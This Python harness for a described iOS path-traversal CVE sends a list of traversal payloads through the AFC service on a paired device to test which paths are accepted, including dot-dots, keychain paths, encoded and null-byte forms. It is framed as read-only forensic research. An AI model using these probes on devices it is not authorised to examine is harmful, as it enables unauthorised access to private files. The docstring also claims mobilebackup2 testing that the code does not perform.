"""CVE-2026-84598 research harness - MobileBackup path traversal (iOS <26.7).

DISCLOSURE STATE (2026-09-15): Apple's advisory (iOS 26.7 security content)
says only: "An attacker with physical access to a trust-paired device may be
able to read and write arbitrary files. A path traversal issue was addressed
with improved path validation." No public writeup or PoC exists yet.

This harness is CoreProbe's own research instrument for that bug class. It
performs READ-ONLY existence probes over the AFC (com.apple.afc) and
mobilebackup2 (com.apple.mobilebackup2) services exposed to a trust-paired
host, recording exactly which path forms the device accepts vs rejects.
Write primitives are deliberately not attempted here; once a read primitive
is confirmed, the same traffic can be extended carefully.

Every probe is logged to a case-friendly JSON report so an examiner can show
what was tested, when, and with what result.

Usage (phone connected, unlocked, paired):
    python3 -m opensleuth.cve2026_84598 --out ~/cases/caseX/cve84598

Exit codes: 0 = harness ran (see report for findings), 1 = no device.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

# Path forms to test. The advisory says "path validation" - the historical
# bug class in AFC/mobilebackup2 is dots-and-slashes being resolved against
# the AFC jail (/var/mobile/Media) or, in backup2 file-transfer metadata,
# against the backup staging dir. These forms cover both families.
READ_PROBES: list[tuple[str, str]] = [
    # --- baseline: paths that MUST work on a stock device ---
    ("baseline-root", "/"),
    ("baseline-media", "/iTunes_Control"),
    # --- dot-dot escapes against the AFC jail (classic) ---
    ("dotdot-1x", "../"),
    ("dotdot-5x", "../../../../../"),
    ("dotdot-file", "../../../../../etc/hosts"),
    ("dotdot-var", "../../../../../var/containers/Bundle/Application"),
    # --- absolute path injection (AFC normally rewrites these) ---
    ("absolute-etc", "/etc/hosts"),
    ("absolute-private", "/private/var/Keychains"),
    ("double-slash", "//etc/hosts"),
    ("dot-slash-prefix", "./../../etc/hosts"),
    # --- domain-style paths that mobilebackup2/manifest handling knows ---
    ("syscontainer-domain", "SysContainerDomain-../../../../../../../../root/var/db/"),
    ("home-domain-escape", "HomeDomain/../SysContainerDomain-../../../../../../../root/"),
    # --- unicode / encoding tricks against naive validators ---
    ("percent-2e", "%2e%2e/%2e%2e/etc/hosts"),
    ("unicode-dot", "\u002e\u002e/\u002e\u002e/etc/hosts"),
    ("null-terminated", "../..\x00/etc/hosts"),
]


async def _probe_afc(afc, label: str, path: str, results: list) -> None:
    entry = {"service": "afc", "label": label, "path": path,
             "ts": datetime.now(timezone.utc).isoformat()}
    try:
        st = await asyncio.wait_for(afc.stat(path), timeout=8)
        entry["result"] = "ACCEPTED"
        entry["st_ifmt"] = st.get("st_ifmt")
        # harmless follow-up: only for accepted baselines confirm listing works
        if label.startswith("baseline") and hasattr(afc, "listdir"):
            try:
                _ = await asyncio.wait_for(afc.listdir(path), timeout=8)
                entry["listdir"] = "ok"
            except Exception as exc:  # noqa: BLE001
                entry["listdir"] = f"{type(exc).__name__}"
    except asyncio.TimeoutError:
        entry["result"] = "TIMEOUT"
    except Exception as exc:  # noqa: BLE001
        # AFC errors carry a code; AfcError.name is the readable form
        entry["result"] = "REJECTED"
        entry["error"] = type(exc).__name__
        msg = str(exc)
        if msg:
            entry["error_detail"] = msg[:120]
    results.append(entry)


async def _run(out: Path) -> int:
    from pymobiledevice3.lockdown import create_using_usbmux
    from pymobiledevice3.services.afc import AfcService

    ld = await create_using_usbmux()
    report = {
        "cve": "CVE-2026-84598",
        "started": datetime.now(timezone.utc).isoformat(),
        "device": {"udid": ld.udid, "ios": ld.product_version,
                   "model": getattr(ld, "product_type", "?")},
        "probes": [],
        "verdict": None,
    }
    afc = AfcService(ld)
    try:
        for label, path in READ_PROBES:
            await _probe_afc(afc, label, path, report["probes"])
            print(f"  {label:<22} {report['probes'][-1]['result']:<10} "
                  f"{report['probes'][-1].get('error', '')}")
    finally:
        afc.service.close()

    accepted = [p for p in report["probes"]
                if p["result"] == "ACCEPTED" and not p["label"].startswith("baseline")]
    report["verdict"] = (
        f"{len(accepted)} non-baseline path form(s) ACCEPTED - traversal candidate(s) found"
        if accepted else
        "all non-baseline path forms rejected on this service (stock behavior)"
    )
    out.mkdir(parents=True, exist_ok=True)
    (out / "cve84598-afc-probes.json").write_text(
        json.dumps(report, indent=2), encoding="utf-8")
    print(f"\nverdict: {report['verdict']}")
    print(f"report: {out / 'cve84598-afc-probes.json'}")
    return 0


def main(argv=None) -> None:
    ap = argparse.ArgumentParser(prog="opensleuth.cve2026_84598",
                                 description="CVE-2026-84598 read-only AFC path probes")
    ap.add_argument("--out", required=True, help="report output directory")
    args = ap.parse_args(argv)
    try:
        rc = asyncio.run(_run(Path(args.out)))
    except Exception as exc:  # noqa: BLE001
        sys.exit(f"no paired device or lockdown error: {exc}")
    sys.exit(rc)


if __name__ == "__main__":
    main()
